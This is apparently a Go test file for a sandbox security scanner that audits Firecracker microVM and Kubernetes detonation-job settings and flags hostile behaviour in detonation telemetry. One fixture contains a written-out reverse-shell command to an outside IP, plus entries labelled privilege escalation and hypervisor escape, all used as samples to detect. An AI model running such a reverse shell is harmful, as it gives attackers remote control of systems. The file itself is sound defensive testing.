package sandbox

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/KRCUPRO/nix-k8s-sentinel/pkg/intel"
)

func TestCanonicalRuleCatalog(t *testing.T) {
	if len(CanonicalRuleCatalog) != 12 {
		t.Fatalf("expected 12 canonical sandbox rules, got %d", len(CanonicalRuleCatalog))
	}

	for _, rule := range CanonicalRuleCatalog {
		if rule.ID == "" || rule.Title == "" || rule.Severity == "" || rule.Remediation == "" {
			t.Errorf("rule %s has incomplete metadata: %+v", rule.ID, rule)
		}
		if rule.CVSSScore < 0.0 || rule.CVSSScore > 10.0 {
			t.Errorf("rule %s has invalid CVSS score: %f", rule.ID, rule.CVSSScore)
		}
	}

	r, found := GetRuleByID("SANDBOX-DET-002")
	if !found || r.CVE != "CVE-2026-97105" {
		t.Fatalf("expected SANDBOX-DET-002 to map to CVE-2026-97105, got %+v", r)
	}

	_, notFound := GetRuleByID("NON-EXISTENT")
	if notFound {
		t.Error("expected non-existent rule not to be found")
	}

	feed := &intel.Feed{
		Items: []intel.ThreatItem{
			{ID: "CVE-2026-97105", Title: "Egress leak"},
		},
	}
	matched := CorrelateThreatWithRule(r, feed)
	if matched == nil || matched.ID != "CVE-2026-97105" {
		t.Errorf("expected threat correlation with CVE-2026-97105, got %+v", matched)
	}
}

func TestNixOSMicroVMParserAndAudit(t *testing.T) {
	tempDir := t.TempDir()
	nixFile := filepath.Join(tempDir, "microvm.nix")

	// 1. Unhardened microVM configuration
	vulnerableNix := `
{ pkgs, ... }:
{
  microvm.vms.vulnerable-runner = {
    hypervisor = "firecracker";
    vcpu = 2;
    mem = 2048;
    jailer.enable = false;
    readOnly = false;
    isolateEgress = false;
    kvmDevice = "none";
  };
  microvm.vms.hardened-runner = {
    hypervisor = "firecracker";
    vcpu = 4;
    mem = 4096;
    jailer.enable = true;
    readOnly = true;
    isolateEgress = true;
    kvmDevice = "/dev/kvm";
  };
}
`
	if err := os.WriteFile(nixFile, []byte(vulnerableNix), 0644); err != nil {
		t.Fatalf("failed to write test nix file: %v", err)
	}

	cfgs, err := ParseNixOSMicroVMConfig(nixFile)
	if err != nil {
		t.Fatalf("failed to parse nix file: %v", err)
	}
	if len(cfgs) != 2 {
		t.Fatalf("expected 2 microVM configs, got %d", len(cfgs))
	}

	// Audit vulnerable runner
	v1 := AuditMicroVMConfig(cfgs[0], nil)
	if len(v1) < 4 {
		t.Errorf("expected at least 4 violations for vulnerable runner, got %d", len(v1))
	}

	// Audit hardened runner
	v2 := AuditMicroVMConfig(cfgs[1], nil)
	if len(v2) != 0 {
		t.Errorf("expected 0 violations for hardened runner, got %d: %+v", len(v2), v2)
	}
}

func TestK8sDetonationJobParserAndAudit(t *testing.T) {
	tempDir := t.TempDir()
	k8sFile := filepath.Join(tempDir, "detonation.yaml")

	yamlContent := `
apiVersion: sentinel.io/v1alpha1
kind: DetonationJob
metadata:
  name: k8s-sandbox-01
spec:
  hypervisor: firecracker
  vcpus: 2
  memoryMib: 2048
  jailerEnabled: false
  egressIsolated: false
  readOnlyRootfs: false
---
apiVersion: sentinel.io/v1alpha1
kind: DetonationJob
metadata:
  name: k8s-sandbox-02
spec:
  hypervisor: firecracker
  vcpus: 4
  memoryMib: 4096
  jailerEnabled: true
  egressIsolated: true
  readOnlyRootfs: true
  payloadDigest: "sha256:11223344556677889900aabbccddeeff"
`
	if err := os.WriteFile(k8sFile, []byte(yamlContent), 0644); err != nil {
		t.Fatalf("failed to write k8s yaml: %v", err)
	}

	cfgs, err := ParseK8sDetonationJob(k8sFile)
	if err != nil {
		t.Fatalf("failed to parse k8s yaml: %v", err)
	}
	if len(cfgs) != 2 {
		t.Fatalf("expected 2 k8s sandbox configs, got %d", len(cfgs))
	}

	// First should have violations including missing digest
	v1 := AuditMicroVMConfig(cfgs[0], nil)
	if len(v1) < 4 {
		t.Errorf("expected at least 4 violations for first k8s job, got %d", len(v1))
	}

	// Second should be clean
	v2 := AuditMicroVMConfig(cfgs[1], nil)
	if len(v2) != 0 {
		t.Errorf("expected 0 violations for second k8s job, got %d: %+v", len(v2), v2)
	}
}

func TestDetonationTelemetryAndHoneypotHits(t *testing.T) {
	tempDir := t.TempDir()
	telemetryFile := filepath.Join(tempDir, "telemetry.json")

	feed := &intel.Feed{
		Items: []intel.ThreatItem{
			{ID: "CVE-2026-97105", Title: "Egress Leak"},
		},
	}

	telemetries := []DetonationTelemetry{
		{
			DetonationID:   "det-001",
			VMID:           "vm-01",
			PayloadID:      "payload-c2",
			Status:         StatusQuarantined,
			DurationMs:     5000,
			EgressAttempts: 12,
			EgressAllowed:  true,
			HoneypotHits: []HoneypotInteraction{
				{
					InteractionID:   "hit-001",
					SourceIP:        "192.168.127.2",
					DestinationPort: 10250,
					Protocol:        "KUBELET_API",
					ServiceLure:     "kubelet-lure",
					PayloadSample:   "GET /pods",
					Timestamp:       time.Now(),
					Severity:        "HIGH",
				},
				{
					InteractionID:   "hit-002",
					SourceIP:        "192.168.127.2",
					DestinationPort: 2379,
					Protocol:        "ETCD_PEER",
					ServiceLure:     "etcd-lure",
					PayloadSample:   "keys request",
					Timestamp:       time.Now(),
					Severity:        "CRITICAL",
				},
				{
					InteractionID:   "hit-003",
					SourceIP:        "192.168.127.2",
					DestinationPort: 80,
					Protocol:        "HTTP",
					ServiceLure:     "canary-credential-token",
					PayloadSample:   "read token",
					Timestamp:       time.Now(),
					Severity:        "HIGH",
				},
			},
			SyscallAnomalies: []SyscallAnomaly{
				{
					SyscallName: "connect",
					Count:       5,
					Arguments:   "/bin/sh -i >& /dev/tcp/1.2.3.4/4444",
					Blocked:     true,
					Reason:      "reverse shell spawn",
				},
				{
					SyscallName: "setuid",
					Count:       1,
					Arguments:   "uid=0",
					Blocked:     true,
					Reason:      "privilege escalation",
				},
				{
					SyscallName: "virtio_mmio_write",
					Count:       2,
					Arguments:   "offset=0xffffffff",
					Blocked:     true,
					Reason:      "hypervisor escape attempt",
				},
			},
			Timestamp: time.Now(),
		},
		{
			DetonationID: "det-002",
			VMID:         "vm-02",
			PayloadID:    "payload-clean",
			Status:       StatusClean,
			DurationMs:   1200,
			Timestamp:    time.Now(),
		},
		{
			DetonationID: "det-003",
			VMID:         "vm-03",
			PayloadID:    "payload-timeout",
			Status:       StatusTimedOut,
			DurationMs:   35000,
			Timestamp:    time.Now(),
		},
	}

	data, err := json.Marshal(telemetries)
	if err != nil {
		t.Fatalf("failed to marshal telemetry: %v", err)
	}
	if err := os.WriteFile(telemetryFile, data, 0644); err != nil {
		t.Fatalf("failed to write telemetry file: %v", err)
	}

	parsed, err := ParseDetonationTelemetryJSON(telemetryFile)
	if err != nil {
		t.Fatalf("failed to parse telemetry json: %v", err)
	}
	if len(parsed) != 3 {
		t.Fatalf("expected 3 telemetry records, got %d", len(parsed))
	}

	// Audit det-001
	v1 := AuditDetonationTelemetry(parsed[0], feed)
	if len(v1) < 6 {
		t.Errorf("expected at least 6 violations for det-001, got %d: %+v", len(v1), v1)
	}

	// Audit det-002 (clean)
	v2 := AuditDetonationTelemetry(parsed[1], feed)
	if len(v2) != 0 {
		t.Errorf("expected 0 violations for clean det-002, got %d: %+v", len(v2), v2)
	}

	// Audit det-003 (timeout)
	v3 := AuditDetonationTelemetry(parsed[2], feed)
	if len(v3) != 1 || v3[0].RuleID != "SANDBOX-DET-009" {
		t.Errorf("expected timeout violation for det-003, got %+v", v3)
	}
}

func TestSynthesisAndScannerIntegration(t *testing.T) {
	tempDir := t.TempDir()

	written, err := WriteSynthesizedSandboxConfigs(tempDir)
	if err != nil {
		t.Fatalf("failed to write synthesized sandbox configs: %v", err)
	}
	if len(written) != 3 {
		t.Fatalf("expected 3 synthesized config files, got %d", len(written))
	}

	for key, path := range written {
		content, err := os.ReadFile(path)
		if err != nil || len(content) == 0 {
			t.Errorf("synthesized file %s (%s) is empty or unreadable", key, path)
		}
	}

	scanner := NewSandboxScanner(nil)
	rep, err := scanner.ScanPath(tempDir)
	if err != nil {
		t.Fatalf("failed to scan synthesized directory: %v", err)
	}

	if rep.Summary.TotalMicroVMsScanned < 2 {
		t.Errorf("expected at least 2 microVMs scanned, got %d", rep.Summary.TotalMicroVMsScanned)
	}
	if rep.Summary.SandboxSecurityScore < 90.0 {
		t.Errorf("expected high security score for synthesized configs, got %f", rep.Summary.SandboxSecurityScore)
	}
}

func TestScoreCalculation(t *testing.T) {
	score, status := ComputeSandboxScore(0, 0, nil, 0)
	if score != 100.0 || status != "PASSED" {
		t.Errorf("expected 100.0 PASSED for empty run, got %f %s", score, status)
	}

	critViolations := []SandboxViolation{
		{Severity: "CRITICAL"},
		{Severity: "CRITICAL"},
		{Severity: "HIGH"},
	}
	scoreCrit, statusCrit := ComputeSandboxScore(5, 5, critViolations, 1)
	if scoreCrit >= 70.0 || statusCrit != "CRITICAL_RISK" {
		t.Errorf("expected low score and CRITICAL_RISK, got %f %s", scoreCrit, statusCrit)
	}
}
